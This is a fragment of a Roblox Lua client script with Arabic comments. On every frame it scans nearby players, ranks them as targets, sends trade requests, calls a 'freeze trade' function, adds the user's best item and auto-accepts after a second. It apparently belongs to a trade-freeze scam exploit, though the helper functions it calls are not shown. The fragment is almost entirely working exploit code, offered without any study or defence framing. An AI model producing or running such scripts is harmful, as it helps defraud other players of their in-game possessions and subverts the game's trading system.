RunService.Heartbeat:Connect(function()
    if not Config.Enabled or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end

    local now = tick()
    if now - lastScanTime < Config.ScanInterval then return end
    lastScanTime = now

    local hrp = LocalPlayer.Character.HumanoidRootPart
    local targets, ultraTargets, priorityTargets = {}, {}, {}

    -- فحص جميع اللاعبين
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (hrp.Position - plr.Character.HumanoidRootPart.Position).Magnitude
            if dist <= Config.MaxDistance then
                local res = scanPlayer(plr)
                if res then
                    if res.ultra then
                        table.insert(ultraTargets, res)
                    elseif res.priority then
                        table.insert(priorityTargets, res)
                    else
                        table.insert(targets, res)
                    end
                end
            end
        end
    end

    PriorityCount = #priorityTargets
    UltraPriorityCount = #ultraTargets

    -- إرسال طلبات التداول حسب الأولوية
    if Config.AutoSendRequest then
        local targetList = #ultraTargets > 0 and ultraTargets or (#priorityTargets > 0 and priorityTargets or targets)
        
        for _, t in ipairs(targetList) do
            if sendTradeRequest(t.player) then
                -- تجميد التداول فوراً
                freezeTrade(t.player.UserId)
                
                -- إضافة أفضل البراينروت
                addBestBrainrotToTrade()
                
                -- قبول تلقائي بعد فترة قصيرة
                spawn(function()
                    task.wait(1)
                    autoAcceptTrade(t.player.UserId)
                end)
                
                task.wait(0.5)
                break
            end
        end
    end
end)

